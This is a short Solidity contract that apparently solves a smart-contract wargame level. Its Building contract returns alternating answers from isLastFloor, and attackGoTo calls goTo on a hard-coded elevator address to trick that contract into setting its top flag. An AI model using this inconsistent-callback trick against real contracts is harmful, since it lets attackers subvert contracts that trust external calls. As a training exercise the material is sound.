// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "./Elevator.sol";

interface Salivator {
    function goTo(uint256) external;
}

contract Building {
    // bool public top;
    uint256 public counter;
    address public elevator = 0xec9Df9Da196704dF8D3b82DF5d48CE447715d014;

    function isLastFloor(uint256 _floor) external returns (bool) {
        counter++;
        if (counter % 2 == 0) return true;
        else return false;
    }

    function attackGoTo() external {
        Salivator(elevator).goTo(0);
    }
}
